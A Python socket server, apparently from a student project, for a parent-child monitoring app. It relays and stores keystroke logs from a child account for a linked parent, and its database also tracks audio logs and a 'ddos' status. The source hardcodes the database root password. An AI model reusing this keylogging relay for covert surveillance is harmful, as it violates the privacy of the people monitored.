# server.py
import socket
import threading
import tools_no_encryption
import os
import datetime
from db_manager import DatabaseManager
from create_tables import create_all_tables
from constants import IP, PORT
from encrypt import Encryption

class Server:
    def __init__(self):
        self.db = DatabaseManager("localhost", "root", "2wsx3edc4rfv", "project_maria")
        self.encryptor = Encryption()
        self.clients = {}  # client_id -> socket
        self.lock = threading.Lock()
        self.clients_logs = {}  # child_id -> list[str]

        try:
            if "clients" not in self.db.show_tables():
                create_all_tables(self.db)
        except Exception:
            create_all_tables(self.db)

    def start(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((IP, PORT))
        server_socket.listen()
        print(f"Server listening on {IP}:{PORT}")

        while True:
            client_socket, _ = server_socket.accept()
            threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True).start()

    def handle_client(self, client_socket):
        client_id = None
        sibling_id = None
        try:
            while True:
                request = self.encryptor.receive_encrypted_message(client_socket)
                if not request: break
                
                parts = request.split("|")
                command = parts[0]

                if command == "LOGIN":
                    username, password = parts[1], parts[2]
                    password_hash = tools_no_encryption.get_hash_value(password)
                    users = self.db.get_rows_with_value("clients", "client_username", username)

                    if not users:
                        self.encryptor.send_encrypted_message(client_socket, "LOGIN_FAIL")
                        continue
                    
                    user = users[0]

                    if user[4] != password_hash:
                        self.encryptor.send_encrypted_message(client_socket, "LOGIN_FAIL|Wrong password")
                        continue

                    client_id = user[0]
                    role = user[5]
                    sibling_id = user[6]

                    with self.lock:
                        self.clients[client_id] = client_socket

                    response = f"LOGIN_OK|{role}|{'CONNECTED' if sibling_id else 'NO_SIBLING'}"
                    self.encryptor.send_encrypted_message(client_socket, response)

                elif command == "REGISTER":
                    username, password, role = parts[1], parts[2], parts[3].lower()
                    password_hash = tools_no_encryption.get_hash_value(password)
                    
                    p_id = None
                    if role == "child":
                        p_id = int(parts[4])
                        parent_rows = self.db.get_rows_with_value("clients", "client_id", p_id)
                        if not parent_rows or parent_rows[0][5] != "parent" or parent_rows[0][6] is not None:
                            self.encryptor.send_encrypted_message(client_socket, "REGISTER_INVALID_PARENT")
                            continue

                    new_user_id = self.db.insert_row(
                        "clients",
                        "(client_ip, client_port, client_username, client_password, client_role, client_sibling_id, client_ddos_status, client_total_audio_logs, client_total_keylogs)",
                        "(%s,%s,%s,%s,%s,%s,%s,%s,%s)",
                        (None, None, username, password_hash, role, None, False, 0, 0)
                    )

                    if role == "child" and p_id:
                        self.db.update_row("clients", "client_id", new_user_id, ["client_sibling_id"], [p_id])
                        self.db.update_row("clients", "client_id", p_id, ["client_sibling_id"], [new_user_id])
                    
                    self.encryptor.send_encrypted_message(client_socket, f"REGISTER_OK|{new_user_id}")

                elif command == "FORWARD":
                    payload = request[len("FORWARD|"):]
                    if payload.startswith("KEYLOG_START"):
                        if sibling_id is not None:
                            self.clients_logs[sibling_id] = []
                    elif payload.startswith("KEYLOG_DATA|"):
                        if len(payload.split("|", 1)) > 1:
                            data = payload.split("|", 1)[1]
                            if client_id in self.clients_logs:
                                self.clients_logs[client_id].append(data)
                    elif payload.startswith("KEYLOG_STOP"):
                        if sibling_id in self.clients_logs and self.clients_logs[sibling_id]:
                            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                            filename = f"log_{sibling_id}_{timestamp}.txt"
                            full_log = "".join(self.clients_logs[sibling_id])
                            
                            # Save with encoding safety
                            with open(filename, "w", encoding="utf-8", errors="replace") as f:
                                f.write(full_log)

                            self.db.insert_row(
                                "keylogs",
                                "(keylog_parent_id, keylog_child_id, keylog_path_name)",
                                "(%s, %s, %s)",
                                (client_id, sibling_id, filename)
                            )
                            del self.clients_logs[sibling_id]
                    with self.lock:
                        if sibling_id and sibling_id in self.clients:
                            target_socket = self.clients[sibling_id]
                            self.encryptor.send_encrypted_message(target_socket, payload)

                elif command == "LOGOUT":
                    break

        except Exception as e:
            print(f"Error: {e}")
        finally:
            with self.lock:
                if client_id in self.clients: del self.clients[client_id]
            client_socket.close()

if __name__ == "__main__":
    Server().start()